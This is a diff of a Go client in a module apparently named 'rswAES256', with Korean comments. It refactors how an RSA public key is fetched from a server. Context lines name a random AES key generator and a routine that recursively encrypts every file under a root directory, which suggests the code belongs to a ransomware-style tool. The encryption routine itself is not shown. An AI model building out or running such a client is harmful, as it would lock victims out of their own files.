@@ -2,12 +2,10 @@ package client
 
 import (
 	"crypto/rand"
+	"crypto/rsa"
 	"encoding/hex"
-	"encoding/json"
 	"fmt"
-	"io"
 	"log"
-	"net/http"
 	"os"
 	"path/filepath"
 	"rswAES256/decrypt"
@@ -28,36 +26,19 @@ func (c *Client) CreateRandomKey() []byte {
 }
 
 // GetPublicKey 는 서버로부터 공개키를 가져온다.
-func (c *Client) GetPublicKey() (*string, error) {
-	res, err := http.Get(c.config.Network.Uri)
+func (c *Client) GetPublicKey() (*rsa.PublicKey, error) {
+
+	pkJson := NewPublicKeyJSON()
+	// 서버로 공개키 요청.
+	publicKey, err := pkJson.GetPublicKey(c.config.Network.Uri)
 	if err != nil {
 		log.Println(err)
 		return nil, err
 	}
 
-	// body 닫기
-	defer func(Body io.ReadCloser) {
-		err = Body.Close()
-		if err != nil {
-			log.Println("Error closing response body:", err)
-		}
-	}(res.Body)
+	c.PublicKey = publicKey
 
-	// body 읽어옴
-	body, err := io.ReadAll(res.Body)
-	if err != nil {
-		log.Println(err)
-		return nil, err
-	}
-
-	// body에 있는 데이터를 client에 넣어줌.
-	err = json.Unmarshal(body, &c)
-	if err != nil {
-		log.Println(err)
-		return nil, err
-	}
-
-	return &c.PublicKey, nil
+	return c.PublicKey, nil
 }
 
 // AESEncryptDirectory 는 전달한 root 경로부터 하위 폴더까지 탐색하면서 파일을 암호화 합니다.
